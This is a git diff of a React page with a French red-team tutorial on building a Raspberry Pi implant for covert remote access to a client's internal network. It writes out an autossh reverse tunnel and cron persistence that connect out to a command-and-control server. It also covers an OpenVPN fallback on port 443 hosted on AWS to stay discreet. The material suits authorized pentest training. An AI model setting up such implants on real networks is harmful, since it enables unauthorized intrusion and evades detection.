@@ -1,9 +1,10 @@
 import React from 'react';
+import HackThePlanet from "../img/hacktheplanet.gif"
 import Hide from "../img/hide_raspberry.jpg"
 import Methodo from "../img/methodo.jpg"
 import KaliRaspberry from "../img/kali_raspberry.png"
-import Raspap01 from "../img/raspap_01.png"
-import Raspap02 from "../img/raspap_02.png"
+import Raspap from "../img/raspap_01.png"
+
 
 
 class Redteam extends React.Component {
@@ -18,8 +19,7 @@ class Redteam extends React.Component {
 
         <p className="tabulation">Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : le <strong>RedTeam</strong>. <br/><br/>L’objectif est de dérouler un scénario complet d'attaque depuis l'externe jusqu’à l'interne et la capacité d'effectuer des actions critiques au sein du SI ciblé. Par rapport à un pentest traditionnel la durée est généralement plus longue et les moyens, plus variés (ex: phishing des employés, intrusions physiques dans les locaux).</p>
 
-        <br/>
-        <br/>
+        <img id="hacktheplanet" src={HackThePlanet} alt="hack the planet"></img>
 
         <h2>Contexte</h2>
         <p className="tabulation">Notre projet consiste à créer un implant qu'il suffira de déposer chez un client pour avoir un accès à distance au réseau interne. Cela représente la phase de compromission initiale dans le schéma de redteam suivant: <br/>
@@ -141,11 +141,7 @@ class Redteam extends React.Component {
           <li>Mot de passe du SSID : ChangeMe</li>
         </ul>
 
-        <img src={Raspap01} alt="raspap_AP"/>
-
-        <p>Dans la liste des points d’accès WiFi, normalement un nouveau nommé raspi-webgui est apparu. (Démo sous Windows 10)</p>
-
-        <img src={Raspap02} alt="raspap_password"/>
+        <img id="raspap" src={Raspap} alt="raspap_AP"/>
 
         {/* Installation manuelle (sans raspap)
         <div id="wifi">apt-get install hostapd <br/>
@@ -255,7 +251,7 @@ class Redteam extends React.Component {
         </div> */}
 
         <h3>Configurer un reverse shell automatique</h3>
-        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C{"&"}C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^</p>   
+        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C&C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^</p>   
 
         <div id="wifi">
         apt install autossh <br/>
@@ -272,19 +268,20 @@ class Redteam extends React.Component {
         <div id="wifi">cat id_rsa.pub >> ~/.ssh/authorized_keys</div>
 
         <p><strong>[Sur la Raspberry]</strong><br/>
-        On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure)</p>
+        On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure de connexion)</p>
 
         <div id="wifi">
         vim /bin/autossh-connect.sh<br/>
 
         #!/bin/bash<br/>
-        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] &<br/><br/>
+        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] &</div>
 
         -N: n'exécute pas de cmd sur la machine intermédiaire<br/>
         -f: lancé en tache de fond<br/>
         <br/>
-        chmod u+rwx,g+xr,o+x autossh-connect.sh<br/>
+        <div id="wifi">chmod u+rwx,g+xr,o+x autossh-connect.sh</div>
 
+        <div id="wifi">
         crontab -e<br/>
         
         #Ajouter à la fin du fichier : <br/>
@@ -293,20 +290,18 @@ class Redteam extends React.Component {
         */5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1<br/>
         </div>
         
-        <p>Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de contrôle</p>
+        <p>Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de commande et contrôle</p>
         <p>Exécutez la commande suivante sur le serveur pour obtenir le reverse shell :</p>
 
-        <div id="wifi">ssh root@localhost -p 6667 (creds de Kali)</div>      
+        <div id="wifi">ssh root@localhost -p 6667 (credentials par défaut de Kali)</div>      
         
         <h3>Configurer un client et un serveur OpenVPN</h3>
-        <p className="tabulation">En plus du reverse shell SSH pour accéder à notre Raspberry, il serait également intéressant de configurer l'appareil pour utiliser une connexion OpenVPN sur le port 443 (HTTPS). 
-        <br/><br/>
-        Étant donné que la Raspberry sera probablement déposée à l'arrière d'un switch dans une entreprise, nous ne pourrons pas nous y connecter directement. Par conséquent, la Raspberry doit d'abord sortir par le port 443 vers notre serveur OpenVPN Access Server. Depuis notre machine d'attaque nous devrons également nous connecter au serveur VPN. Cela est une assurance du fait que si le client bloque le port 22 sortant pour SSH, nous aurons une autre option pour se connecter via le port 443 (HTTPS).
+        <p className="tabulation">Une garantie d'accès en plus du reverse SSH serait d'utiliser une connexion OpenVPN sur le port 443 (HTTPS). La Raspberry devra d'abord sortir par le port 443 vers un serveur OpenVPN Access Server en notre possession et il suffira de se connecter depuis la machine d'attaque au serveur VPN.
         </p>
 
-        <p>Il faut pour cela réaliser les 3 étapes suivantes :</p>
+        <p>Cela se fait en 3 étapes :</p>
         <ul>
-          <li>Configuration d'OpenVPN Access Server sur Internet</li>
+          <li>Configuration d'OpenVPN Access Server sur le net</li>
           <li>Configuration de la Raspberry</li>
           <li>Configuration de la machine d'attaque</li>
         </ul>
@@ -314,29 +309,30 @@ class Redteam extends React.Component {
         <br/>
 
         <h3>Mise en place OpenVPN Access Server</h3>
-        <p className="tabulation">Pour la solution d'hébergement de notre serveur VPN on peut opter pour un serveur VPS car ils sont extrêmement faciles et rapides à configurer.<br/>
+        <p className="tabulation">Pour la solution d'hébergement du serveur VPN on peut opter pour un serveur VPS car ils sont faciles et rapides à mettre en place.<br/>
 
-        <strong>Vultr.com </strong>et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS rapides, bon marché et simples à configurer. L'autre raison de choisir ces fournisseurs VPS est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret. 
+        <strong>Vultr.com</strong> et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS bon marché et simples à configurer. L'autre raison de ce choix est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret dans le réseau. 
         </p>
 
         <ol>
-          <li>Allez sur https://aws.amazon.com/lightsail/ et créez un nouveau VPS</li>
+          <li>Allez sur <a href="https://aws.amazon.com/lightsail/">Lien VPS amazon</a>, se connecter puis créer un nouveau VPS</li>
 
-          Une fois crée, allez sur Manage -> Networking
+          Une fois crée, Manage -> Networking
 
           Ajoutez 2 règles firewall sur les ports (443 et 943)
 
-          <li>Installez un OS, par exemple Ubuntu. Faire un chmod 600 de la SSH key et se connectez sur le VPS server à partir de la machine d'attaque : </li>
-          ssh -i LightsailDefaultPrivateKey-us-west-2.pem user@[IP]
+          <li>Installez un OS (par exemple Ubuntu). Faire un chmod 600 de la SSH key et se connectez sur le VPS server à partir de la machine d'attaque : </li>
+          ssh -i LightsailDefaultPrivateKey-us-west-2.pem user@[IP] <br/>
           sudo su -
-          <li>Update le serveur:</li>
-          apt-get update && apt-get upgrade
-          <li><a href="https://openvpn.net/vpn-software-packages/">Installez OpenVPN AS</a></li>
-
-          <li>Copiez le lien et téléchargez-le, par exemple:</li>
-          wget https://openvpn.net/downloads/openvpn-as-latest-ubuntu18.amd_64.deb
+          <li>mettre à jour le serveur:</li>
           <li>Installez OpenVPN AS</li>
-          dpkg -i openvpn-as-latest-ubuntu18.amd_64.deb
+          <p>apt update && apt -y install ca-certificates wget net-tools <br/>
+            wget -qO - https://as-repository.openvpn.net/as-repo-public.gpg | apt-key add - <br/>
+            echo "deb http://as-repository.openvpn.net/as/debian bionic main">/etc/apt/sources.list.d/openvpn-as-repo.list <br/>
+            apt update && apt -y install openvpn-as <br/>
+          </p>
+
+      
           <li>Supprimez le profil actuel et configurez OpenVPN:</li>
           /usr/local/openvpn_as/bin/ovpn-init
           <li>Tapez DELETE: (sensible à la casse)</li>
@@ -351,6 +347,8 @@ class Redteam extends React.Component {
           Answer: 1 <br/>
           Please specify the port number for the Admin Web UI. <br/>
           Answer: 943 <br/>
+          Please specify the TCP port number for the OpenVPN Daemon <br/>
+          Answer: 443 <br/>
           Should client traffic be routed by default through the VPN? <br/>
           Answer: YES <br/>
           Should client DNS traffic be routed by default through the VPN? <br/>
@@ -359,24 +357,28 @@ class Redteam extends React.Component {
           > Press ENTER for default [no]:  <br/>
           Answer: YES <br/>
           The rest of these answers should be default. Simply hit the 'Enter' key <br/>
-          Change OpenVPN Admin password: <br/>
-          passwd openvpn supersecretpassword123 [Set your own unique password here] <br/>
-          [Note - This is a great time to put IPTables for port 943 to only allow connections from your networks.]</p>
+          
+          passwd openvpn <br/>
+          At the prompt, set a password for the user openvpn.<br/>
+
+          Connect to the admin page and login using the openvpn user with the new password.<br/>
+
+          https://server-ip:943/admin/<br/>
+          </p>
 
           <br/>
 
           <h3>Configuration de OpenVPN AS Server</h3>
-
           <ol>
             <li>Allez sur https://[IP Address du serveur VPS]:943/admin/</li>
             <li>Se connecter avec le compte "openvpn" et le mot de passe récemment crée <br/>
             Note: Si vous utilisez AWS Lightsail, assurez-vous dans les paramètres que le nom d'hôte ou l'adresse IP est l'adresse IP publique et non la privée, puis enregistrez et mettez à jour.</li>
             <li>Dans OpenVPN, vérifiez que l'authentification est définie sur locale: <br/>
             Authentication -> General -> Set to Local (On) -> Save Settings -> Update Server</li>
-            <li>Créez deux utilisateurs avec l'option `Autoriser la connexion automatique activée` (rasp4 and redteam). Allez sur User Management -> User Permissions<br/>
-            Pour chaque utilisateur:<br/>
+            <li>Allez sur User Management -> User Permissions<br/>
+            Créez un utilisateur : redteam et activez l'option<br/>
             Set AllowAuto-login</li>
-            <li>Pour que les 2 comptes permettent la connectivité via VPN, nous devons activer certaines autorisations. Assurez-vous d'activer les autorisations de l'utilisateur:<br/>
+            <li>Activez les autorisations de l'utilisateur: -> More settings<br/>
             All server-side private subnets<br/>
             All other VPN clients</li>
           </ol>
@@ -386,23 +388,22 @@ class Redteam extends React.Component {
           <ol>
             <li>Se connecter et télécharger les profils https://[Your VPS]:943/?src=connect</li>
             <li>Pour chaque utilisateur se connecter et télécharger le profil</li>
-            <li>Sauvegarder rasp4.ovpn et redteam.ovpn</li>
+            <li>Sauvegarder redteam.ovpn</li>
           </ol>
 
           <br/>
 
           <h3>Configuration de la Raspberry Pi 4</h3>
           <li>Allumez la Raspberry Pi 4 et branchez un câble ethernet</li>
-          <li>Installez OpenVPN: apt-get install openvpn</li>
           <li>Configurez le démarrage automatique de OpenVPN dans le fichier :<br/>
           nano /etc/default/openvpn <br/>
           [Décommentez ‘AUTOSTART=”all”’]</li>
-          <li>Copiez le fichier .ovpn sur la Raspberry :<br/>scp rasp4.ovpn [Raspberry Pi 4 IP]:/etc/openvpn</li>
-          <li>Allez dans /etc/openvpn et renommez rasp4.ovpn en client.conf: <br/>cd /etc/openvpn <br/>mv rasp4.ovpn client.conf</li>
+          <li>Copiez client.ovpn sur la Raspberry dans /etc/openvpn/</li>
+          <li>Renommez le en client.conf</li>
           <li>Activez OpenVPN pour démarrer au boot: <br/>update-rc.d openvpn enable</li>
           <li>Puis reboot</li>
 
-          <p className="tabulation">Cela va lancer le client OpenVPN sur la Raspberry Pi 4. Pour vous assurer que cela fonctionne, retournez dans votre serveur OpenVPN AS et vérifiez les connexions. Accédez à "Utilisateurs actuels" dans le menu État et vous devriez voir le nom d'utilisateur "rasp4" avec l'adresse réelle comme adresse WAN externe de l'endroit où la Raspberry Pi 4 est branchée et une adresse VPN. <br/><br/>
+          <p className="tabulation">Cela va lancer le client OpenVPN sur la Raspberry. Pour vous assurer que cela fonctionne, retournez dans votre serveur OpenVPN AS et vérifiez les connexions. Accédez à "Utilisateurs actuels" dans le menu État et vous devriez voir le nom d'utilisateur "redteam" avec l'adresse réelle comme adresse WAN externe de l'endroit où la Raspberry Pi 4 est branchée et une adresse VPN. <br/><br/>
           
           Nous avons à présent la Raspberry Pi 4 configurée de sorte que dès lors qu'elle se connecte à un réseau, elle va chercher à se reconnecter à notre serveur VPN.</p>
 
